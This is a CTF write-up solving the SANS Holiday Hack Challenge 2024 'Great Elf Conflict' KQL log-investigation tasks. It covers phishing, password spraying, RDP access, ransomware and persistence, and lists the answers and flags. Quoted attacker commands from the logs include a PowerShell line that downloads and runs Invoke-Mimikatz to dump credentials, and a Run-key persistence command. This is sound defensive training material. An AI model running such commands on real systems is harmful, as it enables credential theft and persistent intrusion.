+++
author = "Maik de Kruif"
title = "The Great Elf Conflict"
subtitle = "Act 2 - SANS Holiday Hack Challenge 2024"
date = 2025-01-03T16:29:38+01:00
description = "In The Great Elf Conflict, we dive into the chaos of a cyberattack at the North Pole, unraveling clues left by Team Wombley. For silver, we use KQL to uncover critical data, exposing phishing schemes, compromised accounts, and malware infections. To earn gold, we decode advanced threats, track down malicious files, and find the ransomware with precision queries. By solving all four sections, we bring peace to the elves and secure the North Pole!"
cover = "img/writeups/holiday-hack-challenge/2024/act2/microsoft-kc7/cover.png"
tags = [
    "Holiday Hack Challenge",
    "ctf",
    "hacking",
    "writeup",
]
categories = [
    "ctf",
    "writeups",
    "hacking",
]
+++

## Link

If you want to play the challenge yourself, you can find it here:

<https://2024.holidayhackchallenge.com/>

## Story line

This time, there are two elves. Let's start off by talking to Pepper.

{{< collapsible-block title="Pepper Minstix" isCollapsed="true" class="tight" >}}

> This is weird, I got some intel about an imminent attack.
>
> Pepper Minstix here! I’ve got urgent news from neutral ground.
>
> The North Pole is facing a serious cyber threat, and it’s putting all the factions on edge. The culprits? Some troublemakers from Team Wombley.
>
> They’ve launched a barrage of phishing attacks, ransomware, and even some sneaky espionage, causing quite the stir.
>
> It’s time to jump into action and get cracking on this investigation—there’s plenty of cyber-sleuthing to do.
>
> You’ll be digging into KQL logs, tracking down phishing schemes, and tracing compromised accounts like a seasoned pro.
>
> Malware infections have already breached Alabaster Snowball’s systems, so we need swift action.
>
> Your top mission: neutralize these threats, with a focus on the ransomware wreaking havoc from Team Wombley.
>
> It’s a hefty challenge, but I know you’re up to it. We need your expertise to restore order and keep the peace.
>
> You’ve got the tools, the skills, and the know-how—let’s show Team Wombley we mean business.
>
> Ready to dive in? Let's defend the North Pole and bring back the holiday harmony!

{{< /collapsible-block >}}

Now, let's talk to Wunorse. He's seems to be on the other side of things.

{{< collapsible-block title="Wunorse" isCollapsed="true" class="tight" >}}

> Hey, Wunorse here. We at Team Wombley pulled off some nasty stuff.
>
> Phishing attacks, ransomware, and cyber espionage, oh yeah!
>
> We pulled loads of all-nighters to make it all happen. Energy drinks rock!
>
> Our teams did what Alabaster said we never could and breached Santa's network. We're so rad.
>
> It would take a master defender to fix all the damage we caused. But defense is so lame! Offense is where it's at.
>
> You should just leave them to panic and join our side. We're the coolest, don't you want to be like us?

{{< /collapsible-block >}}

## Hints

There are no hints available.

## Recon

After clicking on the challenge, a new tab opens with a welcome page.

{{< figure class="small inline" src="/img/writeups/holiday-hack-challenge/2024/act2/microsoft-kc7/lander.png" title="Landing screen" >}}

There are some very annoying defaults here for the newsletter sign-up, but after unchecking that and creating an account, we're redirected to the challenge page.

{{< figure class="small inline" src="/img/writeups/holiday-hack-challenge/2024/act2/microsoft-kc7/game-page.png" title="Game screen" >}}

Looking at the page, this will likely be a similar format as [PowerShell]({{% ref "writeups/holiday-hack-challenge/2024/act2/powershell.md" %}}) and [Curling]({{% ref "writeups/holiday-hack-challenge/2024/act1/curling.md" %}}), where we have to solve multiple challenges to get the medal.

If we click on the section on the top left, we find there are four, which coincides with what we see on the objective in HHC. We'll have to solve two sections for silver, and all four for gold.

## Silver

### Section 1: KQL 101

#### Question 1

> Welcome to your mission to solve the The Great Elf Conflict! To do so, you'll need to harness the power of KQL (Kusto Query Language) to navigate through the data and uncover crucial evidence.
>
> Your next step is to meet with Eve Snowshoes, Cyber Engineer, at the at the North Pole Cyber Defense Unit. Eve is known for unmatched expertise in KQL and has been eagerly awaiting your arrival. Alt text
>
> Eve greets you with a nod and gestures toward the terminal. "KQL is like a key, unlocking the hidden secrets buried within the data."
>
> **Type `let’s do this` to begin your KQL training.**

For the first one, we just have to copy what the text tell's us to do.

Answer: `let's do this`

#### Question 2

> The first command Eve Snowshoes teaches you is one of the most useful in querying data with KQL. It helps you peek inside each table, which is critical for understanding the structure and the kind of information you're dealing with. By knowing what's in each table, you’ll be able to create more precise queries and uncover exactly what you need.
>
> ```sql
> Employees
> | take 10
> ```
>
> Eve has shared the first table with you. Now, run a take 10 on all the other tables to see what they contain.
>
> You can find the tables you have access to at the top of the ADX query window.
>
> **Once you've examined all the tables, type `when in doubt take 10` to proceed.**

Second one goes the same as the first one, just copy it.

Answer: `when in doubt take 10`

#### Question 3

> Now, let’s gather more intelligence on the employees. To do this, we can use the count operator to quickly calculate the number of rows in a table. This is helpful for understanding the scale of the data you’re working with.
>
> ```sql
> Employees
> | count
> ```
>
> **How many elves did you find?**

The third one is still simple, copy the query and run it.

Answer: `90`

#### Question 4

> You can use the where operator with the Employees table to locate a specific elf. Here’s a template you can follow:
>
> ```sql
> Employees
> | where <field><operator><value>
> ```
>
> **Field**: The column you want to filter by (e.g., role).
>
> **Operator**: The condition you’re applying (e.g., == for an exact match).
>
> **Value**: The specific value you’re looking for in the field (e.g., Chief Elf Officer).
>
> **Can you find out the name of the Chief Toy Maker?**

We can fill in the template given. This will result in the following query.

<!-- Codeblocks are kql, but there is no syntax highlighting for it. SQL highlighting works well enough. -->

```sql
Employees
| where role == "Chief Toy Maker"
| project name
```

Answer: `Shinny Upatree`

#### Question 5

> Here are some additional operators the North Pole Cyber Defense Unit commonly uses.
>
> **`==`** : Checks if two values are exactly the same. Case-sensitive.
>
> **`contains`** : Checks if a string appears anywhere, even as part of a word. Not case-sensitive.
>
> **`has`** : Checks if a string is a whole word. Not case-sensitive.
>
> **`has_any`** : Checks if any of the specified words are present. Not case-sensitive.
>
> **`in`** : Checks if a value matches any item in a list. Case-sensitive.
>
> **Type `operator` to continue.**

Again, just copy the word.

Answer: `Operator`

#### Question 6

> We can learn more about an elf by cross-referencing information from other tables. Let’s take a look at Angel Candysalt’s correspondence. First, retrieve her email address from the Employees table, and then use it in a query in the Email table.
>
> ```sql
> Email
> | where recipient == "<insert Angel Candysalt’s email address here>"
> | count
> ```
>
> **How many emails did Angel Candysalt receive?**

The template is asking us for the email address of Angel Candysalt, but we don't have it yet. In the previous questions, we did learn how to get an employee's information, so let's do that for Angel.

```sql
Employees
| where name == "Angel Candysalt"
```

If we look at the output, we'll find the email address in the `email_addr` column. We can now fill in the template and run it.

```sql
Email
| where recipient == "angel_candysalt@santaworkshopgeeseislands.org"
| count
```

Answer: `31`

#### Question 7

> You can use the distinct operator to filter for unique values in a specific column.
>
> Here's a start:
>
> ```sql
> Email
> | where sender has "<insert domain name here>"
> | distinct <field you need>
> | count
> ```
>
> **How many distinct recipients were seen in the email logs from twinkle_frostington\@santaworkshopgeeseislands.org?**

Since the question provides us with the exact email address, we don't have to use `has` and we can use `==` instead.

```sql
Email
| where sender == "twinkle_frostington@santaworkshopgeeseislands.org"
| distinct recipient
| count
```

Answer: `32`

#### Question 8

> It’s time to put everything we’ve learned into action!
>
> ```sql
> OutboundNetworkEvents
> | where src_ip == "<insert IP here>"
> | <operator> <field>
> | <operator>
> ```
>
> **How many distinct websites did Twinkle Frostington visit?**

We'll first have to find Twinkle's IP address.

```sql
Employees
| where name == "Twinkle Frostington"
```

The IP is stored in the `ip_addr` table. We can now fill in the template.

```sql
OutboundNetworkEvents
| where src_ip == "10.10.0.36"
| distinct url
| count
```

Answer: `4`

#### Question 9

> **How many distinct domains in the PassiveDns records contain the word green?**
>
> ```sql
> PassiveDns
> | where <field> contains “<value>”
> | <operator> <field>
> | <operator>
> ```
>
> You may have notice we’re using contains instead of has here. That’s because has will look for an exact match (the word on its own), while contains will look for the specified sequence of letters, regardless of what comes before or after it. You can try both on your query to see the difference!

We can fill in the template like this.

```sql
PassiveDns
| where domain contains "green"
| distinct domain
| count
```

Answer: `10`

#### Question 10

> Sometimes, you’ll need to investigate multiple elves at once. Typing each one manually or searching for them one by one isn’t practical. That’s where let statements come in handy. A let statement allows you to save values into a variable, which you can then easily access in your query.
>
> Let’s look at an example. To find the URLs they accessed, we’ll first need their IP addresses. But there are so many Twinkles! So we’ll save the IP addresses in a let statement, like this:
>
> ```sql
> let twinkle_ips =
> Employees
> | where name has "<the name we’re looking for>"
> | distinct ip_addr;
> ```
>
> This saves the result of the query into a variable. Now, you can use that result easily in another query:
>
> ```sql
> OutboundNetworkEvents
> | where src_ip in (twinkle_ips)
> | distinct <field>
> ```
>
> **How many distinct URLs did elves with the first name Twinkle visit?**

We can fill in the template again. Also make sure to not but any empty space between the queries, you won't get any results if you do.

```sql
let twinkle_ips = Employees
| where name has "Twinkle"
| distinct ip_addr;
OutboundNetworkEvents
| where src_ip in (twinkle_ips)
| distinct url
| count

```

Answer: `8`

### Section 2: Operation Surrender: Alabaster's Espionage

#### Question 1

> Eve Snowshoes approaches with a focused expression. "Welcome to Operation Surrender: Alabaster's Espionage. In this phase, Team Alabaster has executed a covert operation, and your mission is to unravel their tactics. You'll need to piece together the clues and analyze the data to understand how they gained an advantage."
>
> **Type surrender to get started!**

Section 2 starts off easy again, just copy the text.

Answer: `surrender`

#### Question 2

> Team Alabaster, with their limited resources, was growing desperate for an edge over Team Wombley. Knowing that a direct attack would be costly and difficult, they turned to espionage. Their plan? A carefully crafted phishing email that appeared harmless but was designed to deceive Team Wombley into downloading a malicious file. The email contained a deceptive message with the keyword “surrender” urging Wombley’s members to click on a link.
> Now, it's up to you to trace the origins of this operation.
>
> **Who was the sender of the phishing email that set this plan into motion?**
>
> Try checking out the email table using the knowledge you gained in the previous section!

We can combine what we've learned in section 1 here.

```sql
Email
| where subject contains "surrender"
| distinct sender
```

Answer: `surrender@northpolemail.com`

#### Question 3

> Team Alabaster’s phishing attack wasn’t just aimed at a single target—it was a coordinated assault on all of Team Wombley. Every member received the cleverly disguised email, enticing them to click the malicious link that would compromise their systems.
>
> Hint: the distinct operator would help here Your mission is to determine the full scale of this operation.
>
> **How many elves from Team Wombley received the phishing email?**

We can build on the previous query by replacing sender with recipient, and adding the count keyword.

```sql
Email
| where subject contains "surrender"
| distinct recipient
| count
```

Answer: `22`

#### Question 4

> The phishing email from Team Alabaster included a link to a file that appeared legitimate to Team Wombley. This document, disguised as an important communication, was part of a carefully orchestrated plan to deceive Wombley’s members into taking the bait.
>
> To understand the full extent of this operation, we need to identify the file where the link led to in the email.
>
> **What was the filename of the document that Team Alabaster distributed in their phishing email?**

File names are often at the end of a url, so we can look for all the links sent in the emails.

```sql
Email
| where subject contains "surrender"
| distinct link
```

By looking at the results, we find that they all end with the same value.

Answer: `Team_Wombley_Surrender.doc`

#### Question 5

> As the phishing emails landed in the inboxes of Team Wombley, one elf was the first to click the URL, unknowingly triggering the start of Team Alabaster’s plan. By connecting the employees to their network activity, we can trace who fell for the deception first. To find the answer, you'll need to join two tables: Employees and OutboundNetworkEvents. The goal is to match employees with the outbound network events they initiated by using their IP addresses.
>
> Here’s an example query to help you:
>
> ```sql
> Employees
> | join kind=inner (
>    OutboundNetworkEvents
> ) on $left.ip_addr == $right.src_ip // condition to match rows
> | where url contains "< maybe a filename :) >"
> | project name, ip_addr, url, timestamp // project returns only the information you select
> | sort by timestamp asc //sorts time ascending
> ```
>
> This query will give you a list of employees who clicked on the phishing URL. The first person to click will be at the top of the list!
>
> **Who was the first person from Team Wombley to click the URL in the phishing email?**

Let's add the filename to the query. We can also add `take 1` at the end to get just the first result.

```sql
Employees
| join kind=inner (
    OutboundNetworkEvents
) on $left.ip_addr == $right.src_ip
| where url contains "Team_Wombley_Surrender.doc"
| project name, ip_addr, url, timestamp
| sort by timestamp asc
| take 1
```

Answer: `Joyelle Tinseltoe`

#### Question 6

> Once the phishing email was clicked and the malicious document was downloaded, another file was created upon execution of the .doc. This file allowed Team Alabaster to gain further insight into Team Wombley’s operations. To uncover this, you’ll need to investigate the processes that were executed on Joyelle Tinseltoe’s machine.
>
> Your mission is to determine the name of the file that was created after the .doc was executed.
>
> Focus on Joyelle Tinseltoe’s hostname and explore the ProcessEvents table. This table tracks which processes were started and by which machines. By filtering for Joyelle’s hostname and looking at the timestamps around the time the file was executed, you should find what you’re looking for. Here’s an example to help guide you:
>
> ```sql
> ProcessEvents
> | where timestamp between(datetime("2024-11-25T09:00:37Z") .. datetime("2024-11-26T17:20:37Z")) //you’ll need to modify this
> | where hostname == "<Joyelle's hostname>"
> ```
>
> This query will show processes that ran on Joyelle Tinseltoe’s machine within the given timeframe.
>
> **What was the filename that was created after the .doc was downloaded and executed?**

We can use what we've learned before about variables here again. First, we find the hostname of Joyelle, and then use that to find the process events. For the date, we can use the result from the previous query.

```sql
let host = Employees
| where name == "Joyelle Tinseltoe"
| project hostname;
ProcessEvents
| where timestamp between(datetime("2024-11-27T14:11:45Z") .. datetime("2024-11-27T14:15:46Z"))
| where hostname in (host)
| distinct process_name
```

We find two results, but the first one looks like the suspicious one.

Answer: `keylogger.exe`

#### Question 7

> Well done on piecing together the clues and unraveling the operation!
>
> Team Alabaster's phishing email, sent from `surrender@northpolemail.com`, targeted 22 elves from Team Wombley. The email contained a malicious document named `Team_Wombley_Surrender.doc`, which led to the first click by Joyelle Tinseltoe.
>
> After the document was downloaded and executed, a malicious file was created, impacting the entire Team Wombley as it ran on all their machines, giving Team Alabaster access to their keystokes!
>
> **To obtain your flag use the KQL below with your last answer!**
>
> ```sql
> let flag = "Change This!";
> let base64_encoded = base64_encode_tostring(flag);
> print base64_encoded
> ```
>
> **Enter your flag to continue**

Just fill in the template.

```sql
let flag = "keylogger.exe";
let base64_encoded = base64_encode_tostring(flag);
print base64_encoded
```

Answer: `a2V5bG9nZ2VyLmV4ZQ==`

### Section 3: Operation Snowfall: Team Wombley's Ransomware Raid

#### Question 1

> "Fantastic work on completing Section 2!" Eve Snowshoes, Senior Security Analyst, says with a proud smile.
>
> "You’ve demonstrated sharp investigative skills, uncovering every detail of Team Wombley’s attack on Alabaster. Your ability to navigate the complexities of cyber warfare has been impressive.
>
> But now, we embark on Operation Snowfall: `Team Wombley’s Ransomware Raid`. This time, the difficulty will increase as we dive into more sophisticated attacks. Stay sharp, and let’s see if you can rise to the occasion once again!"
>
> **Type `snowfall` to begin**

Just a simple copy and paste again.

Answer: `snowfall`

#### Question 2

> Team Wombley’s assault began with a password spray attack, targeting several accounts within Team Alabaster. This attack relied on repeated login attempts using common passwords, hoping to find weak entry points. The key to uncovering this tactic is identifying the source of the attack. Alt text Authentication events can be found in the AuthenticationEvents table. Look for a pattern of failed login attempts.
>
> Here’s a query to guide you:
>
> ```sql
> AuthenticationEvents
> | where result == "Failed Login"
> | summarize FailedAttempts = count() by username, src_ip, result
> | where FailedAttempts >= 5
> | sort by FailedAttempts desc
> ```
>
> **What was the IP address associated with the password spray?**

We can just copy the query and run it. We'll get quite a few results, but the first ones are containing the correct answer already.

```sql
AuthenticationEvents
| where result == "Failed Login"
| summarize FailedAttempts = count() by username, src_ip, result
| where FailedAttempts >= 5
| sort by FailedAttempts desc
```

Answer: `59.171.58.12`

#### Question 3

> After launching the password spray attack, Team Wombley potentially had success and logged into several accounts, gaining access to sensitive systems.
>
> Eve Snowshoes weighs in: "This is where things start to get dangerous. The number of compromised accounts will show us just how far they’ve infiltrated."
>
> **How many `unique` accounts were impacted where there was a successful login from 59.171.58.12?**

Now it's time to create our own query again. First, we'll have to find out what a successful login looks like. We can do that using the following query.

```sql
AuthenticationEvents
| distinct result
```

This returns two results: "Successful Login" and "Failed Login". We can then use this to find the amount of successful logins from `59.171.58.12`.

```sql
AuthenticationEvents
| where src_ip == "59.171.58.12"
| where result == "Successful Login"
| distinct username
| count
```

Answer: `23`

#### Question 4

> In order to login to the compromised accounts, Team Wombley leveraged a service that was accessible externally to gain control over Alabaster’s devices.
>
> Eve Snowshoes remarks, "Identifying the service that was open externally is critical. It shows us how the attackers were able to bypass defenses and access the network. This is a common weak point in many systems."
>
> **What service was used to access these accounts/devices?**

If we take a look at the description field, we find that that log contains the method at the end.

```sql
AuthenticationEvents
| where src_ip == "59.171.58.12"
| where result == "Successful Login"
| project description
```

Answer: `RDP`

#### Question 5

> Once Team Wombley gained access to Alabaster's system, they targeted sensitive files for exfiltration. Eve Snowshoes emphasizes, "When critical files are exfiltrated, it can lead to devastating consequences. Knowing exactly what was taken will allow us to assess the damage and prepare a response."
>
> The ProcessEvents table will help you track activities that occurred on Alabaster’s laptop. By narrowing down the events by timestamp and hostname, you’ll be able to pinpoint the file that was exfiltrated.
>
> **What file was exfiltrated from Alabaster’s laptop?**

Time to combine some queries again. First, we need to find the hostname of Alabaster's pc. Then, we should look for the timestamp on which the attacker logged in. Finally, we use these two values to look for the process events that happened after.

```sql
let host = Employees
| where name has "Alabaster"
| project hostname;
let login_time = toscalar(AuthenticationEvents
| where src_ip == "59.171.58.12"
| where result == "Successful Login"
| where hostname in (host)
| project timestamp);
ProcessEvents
| where hostname in (host)
| where timestamp > login_time
| sort by timestamp asc
```

Quite a few processes ran after the login, but if we look at the `process_commandline` column, we see one file transfer to a network share.

```bat
copy C:\Users\alsnowball\AppData\Local\Temp\Secret_Files.zip \\wocube\share\alsnowball\Secret_Files.zip
```

Answer: `Secret_Files.zip`

#### Question 6

> After exfiltrating critical files from Alabaster’s system, Team Wombley deployed a malicious payload to encrypt the device, leaving Alabaster locked out and in disarray.
>
> Eve Snowshoes comments, "The final blow in this attack was the ransomware they unleashed. Finding the name of the malicious file will help us figure out how they crippled the system."
>
> **What is the name of the malicious file that was run on Alabaster's laptop?**

We can look at the results of the previous query for this one, and scroll down a bit more. There, we will find `C:\Windows\Users\alsnowball\EncryptEverything.exe`

Answer: `EncryptEverything.exe`

#### Question 7

> Outstanding work! You've successfully pieced together the full scope of Team Wombley’s attack. Your investigative skills are truly impressive, and you've uncovered every critical detail.
>
> Just to recap: Team Wombley launched a cyber assault on Alabaster, beginning with a password spray attack that allowed them to gain access to several accounts. Using an external service over RDP, they infiltrated Alabaster’s system, exfiltrating sensitive files including the blueprints for snowball cannons and drones. To further their attack, Wombley executed a malicious file, which encrypted Alabaster’s entire system leaving them locked out and in chaos.
>
> **To obtain your flag use the KQL below with your last answer!**
>
> ```sql
> let flag = "Change This!";
> let base64_encoded = base64_encode_tostring(flag);
> print base64_encoded
> ```
>
> **Enter your flag to continue**

We can just fill in the template again here.

```sql
let flag = "EncryptEverything.exe";
let base64_encoded = base64_encode_tostring(flag);
print base64_encoded
```

Answer: `RW5jcnlwdEV2ZXJ5dGhpbmcuZXhl`

### Section 4: Echoes in the Frost: Tracking the Unknown Threat

#### Question 1

> As you close out the investigation into Team Wombley’s attack, Eve Snowshoes meets you with a serious expression. "You’ve done an incredible job so far, but now we face our most elusive adversary yet. This isn’t just another team—it’s an unknown, highly skilled threat actor who has been operating in the shadows, leaving behind only whispers of their presence. We’ve seen traces of their activity, but they’ve covered their tracks well."
>
> She pauses, the weight of the challenge ahead clear. "This is where things get even more difficult. We’re entering uncharted territory—prepare yourself for the toughest investigation yet. Follow the clues, stay sharp, and let’s uncover the truth behind these Echoes in the Frost."
>
> **Type `stay frosty` to begin**

Just a simple copy and paste again.

Answer: `stay frosty`

#### Question 2

> Noel Boetie, the IT administrator, reported receiving strange emails about a breach from colleagues. These emails might hold the first clue in uncovering the unknown threat actor’s methods. Your task is to identify when the first of these suspicious emails was received.
>
> Eve Snowshoes remarks, "The timing of these phishing emails is critical. If we can identify the first one, we’ll have a better chance of tracing the threat actor’s initial moves."
>
> **What was the timestamp of first phishing email about the breached credentials received by Noel Boetie?**

You probably know the drill by now. We first look up the employees email address, and then query the Email table for it. We also look for emails where the subject contains "credentials".

```sql
let email_noel = Employees
| where name == "Noel Boetie"
| project email_addr;
Email
| where recipient in (email_noel)
| where subject contains "credentials"
| sort by timestamp asc
| take 1
```

Answer: `2024-12-12T14:48:55Z`

#### Question 3

> Noel Boetie followed the instructions in the phishing email, downloading and running the file, but reported that nothing seemed to happen afterward. However, this might have been the key moment when the unknown threat actor infiltrated the system.
>
> **When did Noel Boetie click the link to the first file?**

Time to combine some queries again. We can build on the previous query to get the url of the file from the email. We can then fetch Noel's IP address, and find the timestamp in the OutboundNetworkEvents table.

```sql
let email_noel = Employees
| where name == "Noel Boetie"
| project email_addr;
let mal_url = Email
| where recipient in (email_noel)
| where subject contains "credentials"
| sort by timestamp asc
| take 1
| project link;
let ip_noel = Employees
| where name == "Noel Boetie"
| project ip_addr;
OutboundNetworkEvents
| where src_ip in (ip_noel)
| where url in (mal_url)
| sort by timestamp asc
```

Answer: `2024-12-12T15:13:55Z`

#### Question 4

> The phishing email directed Noel Boetie to download a file from an external domain.
>
> Eve Snowshoes, "The domain and IP they used to host the malicious file is a key piece of evidence. It might lead us to other parts of their operation, so let’s find it."
>
> **What was the IP for the domain where the file was hosted?**

We can grab the domain from the result of the previous query, and look it up in the PassiveDns table.

```sql
PassiveDns
| where domain == "holidaybargainhunt.io"
| project ip
```

Answer: `182.56.23.122`

#### Question 5

> Let’s back up for a moment. Now that we’re thinking this through, how did the unknown threat actor gain the credentials to execute this attack? We know that three users have been sending phishing emails, and we’ve identified the domain they used.
>
> It’s time to dig deeper into the AuthenticationEvents and see if anything else unusual happened that might explain how these accounts were compromised.
>
> Eve Snowshoes suggests, "We need to explore the AuthenticationEvents for these users. Attackers often use compromised accounts to blend in and send phishing emails internally. This might reveal how they gained access to the credentials."
>
> Let’s take a closer look at the authentication events. I wonder if any connection events from `182.56.23.122`. If so **what hostname was accessed?**

This one is fairly straightforward.

```sql
AuthenticationEvents
| where src_ip == "182.56.23.122"
| project hostname
```

Answer: `WebApp-ElvesWorkshop`

#### Question 6

> It appears someone accessed the WebApp-ElvesWorkshop from the IP address `182.56.23.122`. This could be a key moment in the attack. We need to investigate what was run on the app server and, more importantly, if the threat actor dumped any credentials from it.
>
> Eve Snowshoes, "Accessing the web app from an external IP is a major red flag. If they managed to dump credentials from the app server, that could explain how they gained access to other parts of the system."
>
> **What was the script that was run to obtain credentials?**

For this one, we first need to find the timestamp of the first successful login from the given IP. Then, we look up all process events after this timestamp.

```sql
let login_time = toscalar(AuthenticationEvents
| where result == "Successful Login"
| where src_ip == "182.56.23.122"
| sort by timestamp asc
| project timestamp);
ProcessEvents
| where hostname == "WebApp-ElvesWorkshop"
| where timestamp > login_time
| sort by timestamp asc
```

There are again quite a few results, but the first one jumps out already.

```bat
powershell.exe -Command "IEX (New-Object Net.WebClient).DownloadString("https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Exfiltration/Invoke-Mimikatz.ps1"); Invoke-Mimikatz -Command "privilege::debug" "sekurlsa::logonpasswords"
```

This clearly shows that a script is being downloaded.

Answer: `Invoke-Mimikatz.ps1`

#### Question 7

> Okay back to Noel, after downloading the file, Noel Boetie followed the instructions in the email and ran it, but mentioned that nothing appeared to happen.
>
> Since the email came from an internal source, Noel assumed it was safe - yet this may have been the moment the unknown threat actor silently gained access. We need to identify exactly when Noel executed the file to trace the beginning of the attack.
>
> Eve Snowshoes, "It’s easy to see why Noel thought the email was harmless - it came from an internal account. But attackers often use compromised internal sources to make their phishing attempts more believable."
>
> **What is the timestamp where Noel executed the file?**

We can build on the query from question 3 for this one. We just need to save the the timestamp of the connection to a variable, and then query the process events on Noel's machine that happened after.

```sql
let email_noel = Employees
| where name == "Noel Boetie"
| project email_addr;
let mal_url = Email
| where recipient in (email_noel)
| where subject contains "credentials"
| sort by timestamp asc
| take 1
| project link;
let ip_noel = Employees
| where name == "Noel Boetie"
| project ip_addr;
let download_time = toscalar(OutboundNetworkEvents
| where src_ip in (ip_noel)
| where url in (mal_url)
| sort by timestamp asc
| project timestamp);
let host_noel = Employees
| where name == "Noel Boetie"
| project hostname;
ProcessEvents
| where hostname in (host_noel)
| where timestamp > download_time
| sort by timestamp asc
```

The very first result is already the execution of the file.

Answer: `2024-12-12T15:14:38Z`

#### Question 8

> After Noel ran the file, strange activity began on the system, including the download of a file called holidaycandy.hta. Keep in mind that attackers often use multiple domains to host different pieces of malware.
>
> Eve explains, "Attackers frequently spread their operations across several domains to evade detection."
>
> **What domain was the `holidaycandy.hta` file downloaded from?**

For question 8, we can query the OutboundNetworkEvents table for all urls containing the file name.

```sql
let ip_noel = Employees
| where name == "Noel Boetie"
| project ip_addr;
OutboundNetworkEvents
| where src_ip in (ip_noel)
| where url contains "holidaycandy.hta"
| sort by timestamp asc
```

Answer: `compromisedchristmastoys.com`

#### Question 9

> An interesting series of events has occurred: the attacker downloaded a copy of `frosty.txt`, decoded it into a zip file, and used tar to extract the contents of `frosty.zip` into the Tasks directory.
>
> This suggests the possibility that additional payloads or tools were delivered to Noel’s laptop. We need to investigate if any additional files appeared after this sequence.
>
> Eve Snowshoes, "When an attacker drops files like this, it’s often the prelude to more malicious actions. Let’s see if we can find out what else landed on Noel’s laptop."
>
> Did any additional files end up on Noel’s laptop after the attacker extracted frosty.zip?
>
> **what was the first file that was created after extraction?**

This one it a little bit more complicated. Let's first see what happened after the file was downloaded.

```sql
let ip_noel = Employees
| where name == "Noel Boetie"
| project ip_addr;
let download_time = toscalar(OutboundNetworkEvents
| where src_ip in (ip_noel)
| where url contains "holidaycandy.hta"
| sort by timestamp asc
| project timestamp);
let host_noel = Employees
| where name == "Noel Boetie"
| project hostname;
ProcessEvents
| where hostname in (host_noel)
| where timestamp > download_time
| sort by timestamp asc
```

There we're four events after the download. We indeed see the decoding and unzipping. After those, we also see that a new registry key is set.

```powershell
New-Item -Path "HKCU:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" -Name "MS SQL Writer" -Force | New-ItemProperty -Name "frosty" -Value "C:\Windows\Tasks\sqlwriter.exe" -PropertyType String -Force
```

The values set here is interesting.

Answer: `sqlwriter.exe`

#### Question 10

> In the previous question, we discovered that two files, sqlwriter.exe and frost.dll, were downloaded onto Noel’s laptop. Immediately after, a registry key was added that ensures sqlwriter.exe will run every time Noel’s computer boots.
>
> This persistence mechanism indicates the attacker’s intent to maintain long-term control over the system.
>
> Eve Snowshoes, "Adding a registry key for persistence is a classic move by attackers to ensure their malicious software runs automatically. It’s crucial to understand how this persistence is set up to prevent further damage."
>
> **What is the name of the property assigned to the new registry key?**

We already found the registry edit in the previous question, so we only have to look at it's name.

Answer: `frosty`

#### Question 11

> Congratulations! You've successfully identified the threat actor's tactics. The attacker gained access to WebApp-ElvesWorkshop from the IP address 182.56.23.122, dumped credentials, and used those to send phishing emails internally to Noel.
>
> The malware family they used is called Wineloader, which employs a technique known as DLL sideloading. This technique works by placing a malicious DLL in the same directory as a legitimate executable (in this case, sqlwriter.exe).
>
> When Windows tries to load a referenced DLL without a full path, it checks the executable's current directory first, causing the malicious DLL to load automatically. Additionally, the attacker created a scheduled task to ensure sqlwriter.exe runs on system boot, allowing the malicious DLL to maintain persistence on the system.
>
> **To obtain your FINAL flag use the KQL below with your last answer!**
>
> ```sql
> let finalflag = "Change This!";
> let base64_encoded = base64_encode_tostring(finalflag);
> print base64_encoded
> ```

Yay! We got there, now we only need to fill in the template one last time.

```sql
let finalflag = "frosty";
let base64_encoded = base64_encode_tostring(finalflag);
print base64_encoded
```

Answer: `ZnJvc3R5`

## Medals

To get the medals on HHC, we can navigate to the Objectives screen, and enter the last answer of every section there.

## Final elf message

{{< collapsible-block title="Pepper Minstix" isCollapsed="true" class="tight" >}}

> Outstanding work! You've expertly sifted through the chaos of the KQL logs and uncovered crucial evidence. We're one step closer to saving the North Pole!
>
> Bravo! You've traced those phishing emails back to their devious source. Your sharp detective skills are keeping our elves safe from harm!
>
> Fantastic! You've tracked down the compromised accounts and put a stop to the malicious activity. Our systems are stronger thanks to you!
>
> Incredible! You've neutralized the ransomware and restored order across the North Pole. Peace has returned, and it's all thanks to your relentless determination!
>
> Ho-ho-holy snowflakes! You've done it! With the precision of a candy cane craftsman and the bravery of a reindeer on a foggy night, you've conquered all four tasks! You're a true holiday hero!

{{< /collapsible-block >}}

{{< collapsible-block title="Wunorse" isCollapsed="true" class="tight" >}}

> Dude, c'mon. I thought we were bros! Why are you messin' with our achievements like that?
>
> Those phishing emails were totally devious, you gotta admit. Now let's head over to Wombley HQ and I'll show you how we craft them.
>
> Hey, we needed those accounts! Alright, broseph, you got one more chance or I'm telling Wombley how lame you are.
>
> Why you gotta be like that? Not cool. We worked so hard on that ransomware, and you dismantled the whole thing. So many wasted energy drinks...
>
> Whatevs, it's all good. This was just a practice run anyways. The real attack is going down later. And it's gonna be sick!

{{< /collapsible-block >}}
